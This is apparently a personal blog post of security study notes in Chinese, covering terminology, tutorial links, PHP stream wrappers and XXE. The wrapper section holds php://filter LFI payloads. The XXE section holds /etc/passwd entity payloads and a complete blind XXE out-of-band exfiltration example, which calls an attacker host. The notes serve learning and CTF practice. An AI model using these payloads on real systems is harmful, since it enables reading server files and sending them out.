---
layout: post
title: "Security Related"
date: 2026-02-25
category: "Knowledge｜Terminology"
tags: []
draft: false
toc: true
comments: true
---

# Security Related
<!-- more -->

## 名詞解釋

| Vocabulary    | Def.| Comment|
| - | - | - |
| parse| 解析||
| query| 詢問、請求||
| dump| Also called a crash dump or memory dump, a dump is raw data from a computer's memory. It is written to the file system if software crashes" (terminates unexpectedly). This information is a snapshot of what was going on in the computer at the moment the error occurred. The dump can be analyzed by developers to help track down the error, understand it better, and fix it. | [Refer](https://www.computerhope.com/jargon/d/dump.htm)|
| intruder| 入侵者||
| vulnerability | 漏洞、脆弱||
| exploit| An exploit is a code that takes advantage of a software vulnerability or security flaw. It is written either by security researchers as a proof-of-concept threat or by malicious actors for use in their operations. When used, exploits allow an intruder to remotely access a network and gain elevated privileges, or move deeper into the network.| [Refer](https://www.trendmicro.com/vinfo/us/security/definition/exploit)|
| wrapper| 偽協議||
| cipher| 密碼||
| nerf| cause to be weak or ineffective削弱、減弱| [Refer](https://english.cool/op-nerf-buff/)|
| miscellaneous | 混雜的、各種各樣的||
| PoC| Proof of Concept：在 Binary Exploitation 通常指可以使程式發⽣ Crash 觸發異常的程式碼，⽤來證明程式存在漏洞||
| PWN| 1.具漏洞的服務<br>2.目標在是服務中找到該服務的漏洞並注入自己的程式碼，拿到 server 的控制權| [Refer1](https://csc.nccst.nat.gov.tw/shield.aspx/)<br>[Refer2](https://ithelp.ithome.com.tw/articles/10295763) |
|DHCP|主要功能是自動分配IP(192.168.xxx.xxx)，有時效限制(可能是一天)，當新設備加入區網時，會由DHCP自動分配一個IP給該設備，過了一天後如果設備再次訪問DHCP，則會在給予新的IP，否則該IP會直接回收||
|[Encrypt VS Hash](https://ithelp.ithome.com.tw/articles/10193762)|||
|[CRLF VS LF](http://violin-tao.blogspot.com/2016/04/crlflf-bug.html)|||
|[magic method](https://www.analyticsvidhya.com/blog/2021/07/explore-the-magic-methods-in-python/)|||

## 資安 基本教學
* [惡意程式(malware)](https://ithelp.ithome.com.tw/articles/10282551)
* [不安全的連線？HTTPS與SSL憑證](https://ithelp.ithome.com.tw/articles/10240752)
* [Day 018.聽起來好像很厲害的-密碼學](https://ithelp.ithome.com.tw/articles/10248442)
* [Day21-針對Metasploitable 3進行滲透測試(2)-Shell & Reverse Shell基礎知識](https://ithelp.ithome.com.tw/articles/10278494)
* [[2018iThome鐵人賽]Day6:加密和雜湊有什麼不一樣？](https://ithelp.ithome.com.tw/articles/10193762)
* [[2018iThome鐵人賽]Day 4:如何區分加密、壓縮、編碼](https://ithelp.ithome.com.tw/articles/10193241)
* [Day 21.加密演算法要注意的那些毛(一)-加密模式](https://ithelp.ithome.com.tw/articles/10249953)
* [『Day 27』拜託別Pwn我啦！-常見的工具（下）](https://ithelp.ithome.com.tw/articles/10227380)
* [payload VS formData](https://kknews.cc/zh-tw/code/ogmnm55.html)
* [APT](https://blog.trendmicro.com.tw/?p=123)

## Web 教學
### SQL
* [Day 4 很像走迷宮的sqlmap](https://ithelp.ithome.com.tw/articles/10202811)
* [[Day20]-新手的Web系列SQLmap](https://ithelp.ithome.com.tw/articles/10249489)

### SSTI
* [[Day11]SSTI(Server Side Template Injection)](https://ithelp.ithome.com.tw/articles/10272749)
* [[Day13]-SSTI(Server-side template injection)](https://ithelp.ithome.com.tw/articles/10244403)

### PHP
* [Day 12 - PHP 偽協議 (一) ](https://ithelp.ithome.com.tw/articles/10245020)
* [[Day7]-PHP(LFI/RFI)](https://ithelp.ithome.com.tw/articles/10240486)

#### 偽協議
PHP 偽協議（PHP wrappers / stream wrappers）是指 PHP 內建的一種特殊 URI 協議機制，讓你可以用類似 URL 的方式去讀寫「不同來源」的資料，而不只是單純的檔案。為什麼叫「偽協議」？因為它看起來像：
```
http://
ftp://
```
但其實是：

* PHP 內部 stream wrapper
* 不是網路 protocol
* 只是 PHP 處理資料的一種方式

1. `php://filter`: 👉 CTF 最常出現（LFI 利用）
    範例：
    ```php
    include("php://filter/convert.base64-encode/resource=index.php");
    ```
    作用：

    * 對檔案做轉換
    * 可以 base64 encode 原始碼
    * 常用來繞過 LFI 讀 source code

    典型攻擊如下然後再自己 base64 decode。：
    ```php
    ?page=php://filter/convert.base64-encode/resource=config.php
    ```
2. `php://input`: 用來讀 HTTP request body。
    ```php
    file_get_contents("php://input");
    ```
    常見用途：
    * API 接 JSON
    * CTF 裡配合 `include()` 造成 RCE
3. `php://stdout` / `php://stderr`: CLI 環境用。
4. `php://memory` / `php://temp`: 建立記憶體中的暫存檔案。
5. `file://`: 其實是一般檔案讀取。
    ```html
    file:///etc/passwd
    ```
6. `phar://`: `phar`本身是一個php特殊的**壓縮文件**，打包多個php資源到一個 `*.phar`，而`phar://`就是用來讀取phar內容的wrapper，所以利用`phar://`讀取phar file時，會直接對其metadata反序列化
    * **PHP8.0以前**，這是高階但現在堪用的技巧，因為PHH8.0之後這個features就被改掉了。可以透過反序列化觸發 object injection。凡是只要能夠1)檔案可控 2)用讀檔的任意function讀取，就有機會觸發
    * 常見的讀檔function
        ```
        unlink
        include
        file_get_contents
        getimagesize
        file_exists("phar://evil.phar/test.txt");
        ```

### XXE
#### 名詞解釋
* Document Type Definition(DTD):　用來定義 XML 文件的結構規則
    * 沒有DTD的xml
        ```xml
        <creds>
        <user>admin</user>
        </creds>
        ```
    * 有DTD的xml
        ```xml
        <!DOCTYPE creds [
        <!ELEMENT creds (user)>
        <!ELEMENT user (#PCDATA)>
        ]>
        <creds>
        <user>admin</user>
        </creds>
        ```
        這段 DTD 在說：creds 裡面必須有 user，並且user 只能是文字
* DOCTYPE: 用來「宣告」這份 XML 使用哪個 DTD
    * Inline: DTD 直接寫在 XML 裡。
        ```xml
        <!DOCTYPE creds [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        ```
    * External: 從外部引入DTD
        ```xml
        <!DOCTYPE creds SYSTEM "http://example.com/test.dtd">
        ```
        代表去下載 test.dtd ，再用裡面的規則
* ENTITY: XML 裡面可以被「替換成其他內容」的變數，就像 XML 的「巨集（macro）」或「替換符號」。
    * 內建的 ENTITY

        | Entity  | 代表  |
        | ------- | --- |
        | `&lt;`  | `<` |
        | `&gt;`  | `>` |
        | `&amp;` | `&` |
    * 自定義 ENTITY
        ```xml
        <!DOCTYPE creds [
        <!ENTITY name "test">
        ]>
        <creds>
        <user>&name;</user>
        </creds>
        ```
        解析後
        ```xml
        <user>test</user>
        ```
    * 外部 ENTITY (External Entity): 會讀檔案或 URL。
        ```xml
        <!DOCTYPE creds [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
        ]>
        <creds>
        <user>&xxe;</user>
        </creds>
        ```
        當看到 `&xxe;` 就去讀 `/etc/passwd `再把內容塞進來

#### 實際攻擊
XXE 不是 XML 漏洞。而是 XML parser 被允許解析 external entity，如果讀的檔案是個機敏資料，並且有機會顯示出來，那就會是漏洞

#### Blind XXE
有 XXE 漏洞但伺服器「沒有把讀到的資料回顯給你」
* Payload
    ```xml
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE roottag [
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=file:///path/to/file">
    <!ENTITY % dtd SYSTEM "http://0.0.0.0:5000/evil.xml">
    %dtd:
    ]>

    <roottag>&send;</roottag>
    ```
* evil.xml
    ```xml
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://0.0.0.0:5000/?%file;'>">
    %all;
    ```
這是一個<span style="background-color: yellow">標準 Blind XXE + 外部 DTD + OOB 外帶資料</span>的完整攻擊範例

1. 送惡意 XML: 也就是主要payload，
2. 伺服器讀取本地檔案: `%file` 利用php filter wrapper讀取 /path/to/file
3. Base64 編碼
4. 載入外部 DTD（evil.xml）: 因為執行到主要payload的`%dtd`變數
5. evil.xml 建立新的 entity: 定義 `%all`並且`%file`會先展開
6. 伺服器對攻擊者發 HTTP request
7. 攻擊者收到檔案內容: 攻擊者的server log會看到`%file` → base64-encode(file:///path/to/file)

#### 為什麼要分成兩段？
因為：在 XML 規範中
> 不能在內部 DTD 直接把 %file 放進 SYSTEM URL，很多 parser 會擋

也就是不能
```xml
<!DOCTYPE roottag [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY send SYSTEM "http://attacker.com/?x=%file;">
]>

不會變成 → http://attacker.com/?x=(/etc/passwd內容)
```
我們的目的是要達到**字串拼接**並且把內容傳送出來，所以要：
1. 在主 DTD 定義 %file
2. 載入外部 DTD
3. 在外部 DTD 裡組合 URL

這樣才能成功。

### 其他
* [LFI VS RFI](https://ithelp.ithome.com.tw/articles/10240486): LFI(Local File Inclusion)<br>產生的原因是程式設計師未檢查用戶輸入的參數，導致駭客可以讀取server上的敏感文件。開發人員可能貪圖方便，將GET或POST參數直接設定為檔案名稱，直接include該檔案進網頁裡，結果就造成了引入其他檔案，造成資訊洩漏<br><br>RFI(Remote File Include)<br>基本上與LFI概念一樣，只是include的file來源變成從外部引入，觸發條件必須要把php設定參數 `allow_url_include` 設定為 `ON`
* [[Day23]forensics的開始](https://ithelp.ithome.com.tw/articles/10208651)

## Reverse-Engineering
* [[Day10]格式透視-解析PE文件格式（前篇）](https://ithelp.ithome.com.tw/articles/10187490)
* [[Day17] 行為分析－成為逆向大師的第一步－秒懂加殼技術](https://ithelp.ithome.com.tw/articles/10188209)

## PWN
* [『 Day 26』拜託別 Pwn 我啦！ - 常見的工具 （上） ](https://ithelp.ithome.com.tw/articles/10227326)
* [『Day 27』拜託別Pwn我啦！-常見的工具（下）](https://ithelp.ithome.com.tw/articles/10227380)
* [Day25: [Misc] 我從來沒想過我會害怕寫 code](https://ithelp.ithome.com.tw/articles/10226977)